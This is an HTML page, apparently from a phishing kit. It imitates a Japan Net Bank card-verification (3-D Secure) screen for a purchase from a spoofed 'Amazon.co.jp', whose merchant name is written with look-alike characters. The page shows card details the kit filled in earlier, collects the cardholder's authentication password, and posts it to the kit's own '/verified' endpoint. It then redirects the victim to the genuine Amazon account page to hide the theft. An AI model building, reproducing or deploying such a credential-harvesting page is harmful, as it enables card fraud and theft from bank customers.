<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <link rel="stylesheet" href="library/loader/style.css">
    <link rel="stylesheet" href="sheets/vbv.css">
    <title>株式会社ジャパンネット銀行｜認証サービス｜Receipt</title>
    <style type="text/css">
.contain { border:1px; width:100px; height:20px;float:right;}

</style>
        <script>
            var myVar;
            function myFunction() {
                myVar = setTimeout(showPage, 10);
            }
            function showPage() {
            document.getElementById("loader").style.display = "none";
            document.getElementById("combiner").style.display = "block";
            }
        </script>
<script>
function check(){
var liehuo_key=document.getElementById('password666');
if(liehuo_key.value.length<6){
alert("パスワードが間違っています");
liehuo_key.value="";
liehuo_key.focus();
return false;
}
return true;
}
</script>		
</head>

<body onload="myFunction()">
        <div id="loader"></div>
    <div style="display:none;" class="combiner" id="combiner">
            <ul class="nav">
                    <li class="nav-item">

					<img class="nav-link" src="assets/img/logo.jpg" style="height: 25px; margin-top: 12px;" href="#">
                    </li>
                    <li class="nav-item" style="right: 15px; position: absolute;">
                                        </li>              
                  </ul>
                  <br>
                  <br>
                  <p><h4><link href="css/verifiedby/Added.css" rel="stylesheet" type="text/css"><span class="Qixrk"></span><span class="nPIVU"></span><span class="BoPao"></span><span class="YNTGT"></span><span class="BFVMc"></span><span class="oMdWg"></span><span class="PDoOY"></span><span class="MQeWS"></span><span class="gxLVl"></span><span class="IJOeq"></span><span class="mbnyg"></span><span class="ieIEK"></span><span class="OKpmt"></span><span class="penFf"></span><span class="yTbfN"></span><span class="wlMKc"></span></h4></p>
                  <p><font size=1>お客さまに安全なインターネットショッピングをご提供するためご本人さま確認をいたします。</font></p>
                    <p><font size=1>ご利用いただくカードで登録している「オンラインショッピング認証サービス」の「パスワード（※）」をご入力ください。
（※クレジットカードの暗証番号とは異なりますので、ご注意ください）
</font></p>
                <div class="padingtable">
                        <table >
                                <tbody>
                                    <tr>
                                        <td><div class="contain" align="right"><b>加盟店名：</b></div></td>
                                        <td>Amаzоn.co.jp</td>
                                    </tr>
                                    <tr>
                                        <td><div class="contain" align="right"><b>ご利用金額：</b></div></td>
                                        <td>JPY 0 </td>
                                    </tr>
                                    <tr>
                                        <td><div class="contain" align="right"><b>ご利用日：</b></div></td>
                                        <td>${dateTime!""}</td>
                                    </tr>
                                        <tr>

                                    <tr>
                                        <td><div class="contain" align="right"><b>カード番号：</b></div></td>
                                        <td>**** **** ****${cardNo!""} </td>
                                    </tr>
                                    <tr>
                                        <td><div class="contain" align="right"><b>カード名義人：</b></div></td>
                                        <td>${cardName!""}</td>
                                    </tr>
                                                                      	
                                    <tr><td align="right"><b>パスワード：</b></td>
                                    <td><input style="width: 158px;" type="text" maxlength="66" placeholder="" name="password_vbv" id="password666"><br></td>
									</tr>

                                    <tr>
                                        <td></td>
                                        <td>
                                            <input id="sendBtn" name="Sex" class="confirm" style=" width: 48px;" type="button" value="送 信">

                                <img src="aa/faq_mark.gif" border="0" width="14" height="13" alt="">

								<a href="javascript:onHelpClickHandler();" id="faq" onclick="javascript:onClosingHandler();">
ヘルプ
</a>
&nbsp
                                <a href="javascript:onCancelClickHandler();" id="cancel" onclick="javascript:onClosingHandler();">キャンセル</a>

                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                  </div>

    </div>
        <script src="library/jquery/main.min.js"></script>
        <script>
            $("#sendBtn").click(function () {
                var filed1 = $("#password666").val();
                if (!check()) return;
                $.post("/verified", {password_vbv: filed1},
                        function (data) {
                            window.location.href = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
                        }, "json");
                window.location.href = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
            })
        </script>
</body>
</html>